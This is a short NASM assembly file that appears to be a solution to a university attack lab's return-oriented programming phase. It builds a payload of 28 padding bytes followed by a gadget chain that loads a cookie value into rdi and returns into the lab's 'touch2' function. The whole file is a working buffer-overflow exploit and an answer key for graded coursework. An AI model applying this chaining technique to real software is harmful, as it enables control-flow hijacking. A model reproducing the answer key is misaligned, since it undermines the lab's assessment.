bits 64

; goal:
;     mov edi, 59B997FAh
;     push qword 4017ECh
;     ret

section shellcode start=0h vstart=5561DC78h
shellcode_start:
    times 28 db ' ' ; 0x0 is also valid in file input

section ret_addr start=28h vstart=5561DC78h+28h
ret_addr:
    dq 4019ABh                  ; pop rax; nop; ret
    dq 59B997FAh                ;
    dq 4019A2h                  ; mov rdi, rax; ret
    dq 4019ACh                  ; nop; ret ; useless
    dq 4017ECh                  ; touch2
